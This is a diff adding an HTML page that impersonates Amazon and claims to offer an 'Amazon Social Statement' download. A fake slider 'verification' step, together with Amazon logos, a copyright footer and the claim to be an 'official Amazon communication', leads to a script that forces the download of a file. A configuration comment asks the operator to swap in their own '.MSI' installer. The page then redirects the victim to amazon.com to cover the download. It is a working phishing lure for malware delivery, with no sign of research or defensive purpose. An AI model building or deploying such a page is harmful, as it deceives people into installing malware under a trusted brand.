@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Social Statement | Official Document Download</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Amazon Ember', 'Segoe UI', Arial, sans-serif;
+            background: #EAEDED;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            padding: 40px 35px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            max-width: 580px;
+            width: 100%;
+            animation: fadeIn 0.6s ease-in;
+            border: 1px solid #DDD;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Amazon Orange Accent Bar */
+        .amazon-accent {
+            background: linear-gradient(90deg, #FF9900, #FFB84D);
+            height: 4px;
+            border-radius: 4px 4px 0 0;
+            margin: -40px -35px 30px -35px;
+        }
+
+        /* Amazon Logo Centered */
+        .amazon-logo-container {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .amazon-logo-img {
+            height: 35px;
+            width: auto;
+            display: inline-block;
+        }
+
+        .document-icon {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .document-icon svg {
+            width: 70px;
+            height: 70px;
+        }
+
+        h1 {
+            color: #0F1111;
+            font-size: 1.8em;
+            margin-bottom: 8px;
+            font-weight: 700;
+            line-height: 1.3;
+        }
+
+        .amazon-tag {
+            color: #FF9900;
+            font-size: 0.85em;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .divider {
+            border: none;
+            border-top: 1px solid #E7E7E7;
+            margin: 20px 0;
+        }
+
+        .subtitle {
+            color: #0F1111;
+            font-size: 1.05em;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+
+        .description {
+            color: #565959;
+            font-size: 0.95em;
+            line-height: 1.7;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .description strong {
+            color: #0F1111;
+        }
+
+        /* Info Card - Amazon Style */
+        .info-card {
+            background: #F0F2F2;
+            border: 1px solid #D5D9D9;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .info-card h3 {
+            color: #0F1111;
+            font-size: 1em;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .info-card ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .info-card ul li {
+            color: #0F1111;
+            font-size: 0.9em;
+            padding: 6px 0;
+            padding-left: 20px;
+            position: relative;
+            line-height: 1.5;
+        }
+
+        .info-card ul li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #067D62;
+            font-weight: bold;
+        }
+
+        /* Security Badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #F0F2F2;
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 0.85em;
+            color: #565959;
+        }
+
+        .security-badge .lock-icon {
+            color: #067D62;
+            font-size: 1.2em;
+        }
+
+        /* Slider Container */
+        .slider-container {
+            background: #F0F2F2;
+            border: 1px solid #D5D9D9;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 25px 0 15px;
+            position: relative;
+            height: 60px;
+            user-select: none;
+            overflow: hidden;
+        }
+
+        .slider-track {
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            border-radius: 3px;
+            background: #E3E6E6;
+            overflow: hidden;
+        }
+
+        .slider-progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #FF9900, #FFB347);
+            border-radius: 3px;
+            transition: width 0.05s ease;
+        }
+
+        .slider-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #565959;
+            font-weight: 500;
+            font-size: 0.9em;
+            z-index: 2;
+            pointer-events: none;
+            transition: color 0.3s ease;
+            white-space: nowrap;
+        }
+
+        .slider-text.success {
+            color: #0F1111;
+            font-weight: 600;
+        }
+
+        .slider-arrow {
+            position: absolute;
+            top: 50%;
+            left: 8px;
+            transform: translateY(-50%);
+            width: 50px;
+            height: 50px;
+            background: white;
+            border: 1px solid #D5D9D9;
+            border-radius: 3px;
+            cursor: grab;
+            z-index: 3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            transition: box-shadow 0.2s ease, background 0.3s ease, left 0.05s ease;
+            font-size: 1.3em;
+            color: #565959;
+        }
+
+        .slider-arrow:hover {
+            background: #F7FAFA;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .slider-arrow:active {
+            cursor: grabbing;
+            background: #FF9900;
+            color: white;
+            border-color: #FF9900;
+            box-shadow: 0 4px 12px rgba(255, 153, 0, 0.3);
+        }
+
+        .slider-arrow.success {
+            background: #FF9900;
+            color: white;
+            border-color: #FF9900;
+            left: calc(100% - 58px);
+            box-shadow: 0 4px 12px rgba(255, 153, 0, 0.3);
+        }
+
+        .slider-arrow i {
+            pointer-events: none;
+        }
+
+        /* Messages */
+        .success-message {
+            display: none;
+            color: #067D62;
+            font-weight: 500;
+            font-size: 0.95em;
+            margin-top: 12px;
+            animation: fadeIn 0.4s ease-in;
+            background: #F0FDF4;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #BBF7D0;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        /* Redirect Countdown */
+        .redirect-notice {
+            display: none;
+            background: #FFF8F0;
+            border: 1px solid #FFD8A8;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 12px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .redirect-notice.show {
+            display: block;
+        }
+
+        .redirect-notice .countdown-number {
+            font-weight: 700;
+            color: #FF9900;
+            font-size: 1.2em;
+        }
+
+        .error-message {
+            display: none;
+            color: #D13212;
+            font-weight: 500;
+            font-size: 0.85em;
+            margin-top: 8px;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Footer */
+        .amazon-footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #E7E7E7;
+            font-size: 0.8em;
+            color: #565959;
+            line-height: 1.6;
+        }
+
+        .amazon-footer a {
+            color: #007185;
+            text-decoration: none;
+        }
+
+        .amazon-footer a:hover {
+            color: #C7511F;
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .amazon-accent {
+                margin: -30px -20px 25px -20px;
+            }
+            
+            h1 {
+                font-size: 1.4em;
+            }
+            
+            .slider-container {
+                height: 52px;
+            }
+            
+            .slider-arrow {
+                width: 42px;
+                height: 42px;
+                font-size: 1.1em;
+            }
+            
+            .slider-arrow.success {
+                left: calc(100% - 50px);
+            }
+            
+            .amazon-logo-img {
+                height: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Container -->
+    <div class="container">
+        <div class="amazon-accent"></div>
+        
+        <!-- Amazon Logo -->
+        <div class="amazon-logo-container">
+            <img 
+                class="amazon-logo-img" 
+                src="https://m.media-amazon.com/images/G/01/outbound/OutboundTemplates/Amazon_logo_US._BG255,255,255_.png" 
+                alt="Amazon Logo"
+            >
+        </div>
+
+        <p class="amazon-tag">● Official Amazon Document</p>
+        
+        <!-- Document Icon -->
+        <div class="document-icon">
+            <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="12" y="4" width="40" height="56" rx="4" fill="#FF9900" opacity="0.15"/>
+                <rect x="16" y="8" width="32" height="48" rx="2" fill="#FF9900" opacity="0.3"/>
+                <path d="M16 8H40L48 16V52C48 54.2 46.2 56 44 56H20C17.8 56 16 54.2 16 52V12C16 9.8 17.8 8 20 8H16Z" fill="#FF9900"/>
+                <path d="M40 8V16H48L40 8Z" fill="#E68A00"/>
+                <line x1="22" y1="32" x2="42" y2="32" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                <line x1="22" y1="38" x2="38" y2="38" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                <line x1="22" y1="44" x2="34" y2="44" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                <line x1="22" y1="26" x2="42" y2="26" stroke="white" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+        </div>
+        
+        <h1>Your Amazon Social Statement is Ready for Download</h1>
+        
+        <p class="subtitle">
+            Your comprehensive social statement has been prepared and is now available for secure download. 
+            This document contains your complete social records and verification details.
+        </p>
+
+        <hr class="divider">
+
+        <div class="description">
+            <strong>Dear Valued Customer,</strong><br><br>
+            Your official <strong>Amazon Social Statement</strong> has been generated and is ready for immediate download. 
+            This document provides a detailed summary of your social account standing, verification status, 
+            and important updates regarding your account security and compliance information.
+        </div>
+
+        <!-- Info Card -->
+        <div class="info-card">
+            <h3>
+                <span>📋</span> What's Included in Your Social Statement
+            </h3>
+            <ul>
+                <li>Complete social account verification summary</li>
+                <li>Account standing and compliance status</li>
+                <li>Recent social activity and security updates</li>
+                <li>Important notifications regarding your account</li>
+                <li>Terms of service compliance confirmation</li>
+                <li>Data privacy and protection information</li>
+            </ul>
+        </div>
+
+        <!-- Security Badge -->
+        <div class="security-badge">
+            <span class="lock-icon">🔒</span>
+            <span><strong>Secure Download</strong> — Your document is encrypted and protected. Only accessible after verification.</span>
+        </div>
+
+        <p style="color: #565959; font-size: 0.85em; margin-top: 15px; text-align: center;">
+            🔐 Please complete the verification below to access your document
+        </p>
+
+        <!-- Slider Verification -->
+        <div class="slider-container" id="sliderContainer">
+            <div class="slider-track">
+                <div class="slider-progress" id="sliderProgress"></div>
+            </div>
+            <div class="slider-text" id="sliderText">➤ Slide to verify and download</div>
+            <div class="slider-arrow" id="sliderArrow">
+                ➤
+            </div>
+        </div>
+
+        <!-- Messages -->
+        <div class="success-message" id="successMessage">
+            ✅ <strong>Verification Successful!</strong> Your download is starting...
+        </div>
+
+        <!-- Redirect Countdown Notice -->
+        <div class="redirect-notice" id="redirectNotice">
+            <p>✅ <strong>Download Complete!</strong></p>
+            <p>You will be redirected to Amazon in <span class="countdown-number" id="countdownTimer">5</span> seconds...</p>
+            <p style="font-size: 0.8em; margin-top: 8px; color: #565959;">
+                If not redirected, <a href="https://www.amazon.com/" style="color: #007185; font-weight: 600;">click here to go to Amazon.com</a>
+            </p>
+        </div>
+
+        <div class="error-message" id="errorMessage">
+            ⚠️ Please slide the arrow completely to the right to verify your identity.
+        </div>
+
+        <!-- Footer -->
+        <div class="amazon-footer">
+            <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+            <p>
+                <a href="#">Conditions of Use</a> &nbsp;|&nbsp; 
+                <a href="#">Privacy Notice</a> &nbsp;|&nbsp; 
+                <a href="#">Consumer Health Data Privacy Disclosure</a>
+            </p>
+            <p style="margin-top: 8px; font-size: 0.75em;">
+                This is an official Amazon communication. Your privacy and security are important to us.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        const msiFileName = 'Amazon.vps';           // ← CHANGE THIS TO YOUR .MSI FILE NAME
+        const redirectUrl = 'https://www.amazon.com/'; // ← Redirect destination
+        
+        // ============================================
+        // SLIDER VERIFICATION SYSTEM
+        // ============================================
+        const sliderContainer = document.getElementById('sliderContainer');
+        const sliderArrow = document.getElementById('sliderArrow');
+        const sliderProgress = document.getElementById('sliderProgress');
+        const sliderText = document.getElementById('sliderText');
+        const successMessage = document.getElementById('successMessage');
+        const redirectNotice = document.getElementById('redirectNotice');
+        const countdownTimer = document.getElementById('countdownTimer');
+        const errorMessage = document.getElementById('errorMessage');
+        
+        let isDragging = false;
+        let startX = 0;
+        let arrowLeft = 8;
+        let maxSlide = 0;
+        let isCompleted = false;
+        let redirectCountdown = 5;
+        let countdownInterval = null;
+        
+        // Calculate maximum slide distance
+        function calculateMaxSlide() {
+            const containerWidth = sliderContainer.clientWidth;
+            const arrowWidth = sliderArrow.clientWidth;
+            maxSlide = containerWidth - arrowWidth - 16;
+        }
+        
+        // Initialize
+        calculateMaxSlide();
+        window.addEventListener('resize', () => {
+            calculateMaxSlide();
+            if (!isCompleted) {
+                resetSlider();
+            }
+        });
+        
+        // Mouse Events
+        sliderArrow.addEventListener('mousedown', startDrag);
+        document.addEventListener('mousemove', drag);
+        document.addEventListener('mouseup', endDrag);
+        
+        // Touch Events
+        sliderArrow.addEventListener('touchstart', startDrag, { passive: false });
+        document.addEventListener('touchmove', drag, { passive: false });
+        document.addEventListener('touchend', endDrag);
+        
+        function startDrag(e) {
+            if (isCompleted) return;
+            
+            isDragging = true;
+            sliderArrow.style.cursor = 'grabbing';
+            sliderArrow.style.background = '#FF9900';
+            sliderArrow.style.color = 'white';
+            sliderArrow.style.borderColor = '#FF9900';
+            
+            const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+            startX = clientX - arrowLeft;
+            
+            e.preventDefault();
+        }
+        
+        function drag(e) {
+            if (!isDragging || isCompleted) return;
+            
+            const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+            let newLeft = clientX - startX;
+            
+            // Constrain within bounds
+            if (newLeft < 8) newLeft = 8;
+            if (newLeft > maxSlide + 8) newLeft = maxSlide + 8;
+            
+            arrowLeft = newLeft;
+            updateSliderPosition();
+            
+            e.preventDefault();
+        }
+        
+        function endDrag(e) {
+            if (!isDragging) return;
+            
+            isDragging = false;
+            
+            // Reset arrow style
+            if (!isCompleted) {
+                sliderArrow.style.cursor = 'grab';
+                sliderArrow.style.background = 'white';
+                sliderArrow.style.color = '#565959';
+                sliderArrow.style.borderColor = '#D5D9D9';
+            }
+            
+            // Check if slider reached the end (with 95% threshold)
+            const threshold = maxSlide * 0.95;
+            
+            if (arrowLeft - 8 >= threshold) {
+                completeVerification();
+            } else {
+                resetSlider();
+                errorMessage.classList.add('show');
+                setTimeout(() => {
+                    errorMessage.classList.remove('show');
+                }, 2500);
+            }
+        }
+        
+        function updateSliderPosition() {
+            sliderArrow.style.left = arrowLeft + 'px';
+            
+            // Calculate progress percentage
+            const progress = ((arrowLeft - 8) / maxSlide) * 100;
+            sliderProgress.style.width = progress + '%';
+            
+            // Update text when near completion
+            if (progress > 75) {
+                sliderText.textContent = '🔓 Release to download';
+                sliderText.style.color = '#0F1111';
+            } else if (progress > 40) {
+                sliderText.textContent = '➤ Keep sliding to verify...';
+                sliderText.style.color = '#565959';
+            } else {
+                sliderText.textContent = '➤ Slide to verify and download';
+                sliderText.style.color = '#565959';
+            }
+        }
+        
+        function resetSlider() {
+            arrowLeft = 8;
+            sliderArrow.style.left = '8px';
+            sliderArrow.style.cursor = 'grab';
+            sliderArrow.style.background = 'white';
+            sliderArrow.style.color = '#565959';
+            sliderArrow.style.borderColor = '#D5D9D9';
+            sliderProgress.style.width = '0%';
+            sliderText.textContent = '➤ Slide to verify and download';
+            sliderText.style.color = '#565959';
+            sliderArrow.classList.remove('success');
+            sliderText.classList.remove('success');
+        }
+        
+        function completeVerification() {
+            isCompleted = true;
+            
+            // Snap to end
+            arrowLeft = maxSlide + 8;
+            sliderArrow.style.left = arrowLeft + 'px';
+            sliderProgress.style.width = '100%';
+            
+            // Update UI
+            sliderArrow.classList.add('success');
+            sliderArrow.innerHTML = '✓';
+            sliderArrow.style.cursor = 'default';
+            sliderArrow.style.background = '#FF9900';
+            sliderArrow.style.color = 'white';
+            sliderArrow.style.borderColor = '#FF9900';
+            sliderText.textContent = '✅ Verified — Downloading...';
+            sliderText.classList.add('success');
+            
+            // Show success message
+            successMessage.classList.add('show');
+            errorMessage.classList.remove('show');
+            
+            // Start download after short delay
+            setTimeout(() => {
+                triggerDownload();
+            }, 1000);
+        }
+        
+        function triggerDownload() {
+            // Update success message
+            successMessage.innerHTML = '✅ <strong>Download Started!</strong> Your file is downloading. You will be redirected shortly...';
+            
+            // Method 1: Create and click a hidden link (works for .msi files)
+            const link = document.createElement('a');
+            link.href = msiFileName;
+            link.download = msiFileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Method 2: Fallback — redirect to the file directly
+            setTimeout(() => {
+                window.location.href = msiFileName;
+            }, 500);
+            
+            // Show redirect notice and start countdown
+            setTimeout(() => {
+                redirectNotice.classList.add('show');
+                startRedirectCountdown();
+            }, 2000);
+        }
+        
+        function startRedirectCountdown() {
+            redirectCountdown = 5;
+            countdownTimer.textContent = redirectCountdown;
+            
+            countdownInterval = setInterval(() => {
+                redirectCountdown--;
+                countdownTimer.textContent = redirectCountdown;
+                
+                if (redirectCountdown <= 0) {
+                    clearInterval(countdownInterval);
+                    // Redirect to Amazon
+                    window.location.href = redirectUrl;
+                }
+            }, 1000);
+        }
+        
+        // Prevent text selection during drag
+        sliderContainer.addEventListener('selectstart', (e) => {
+            if (isDragging) e.preventDefault();
+        });
+    </script>
+</body>
+</html>
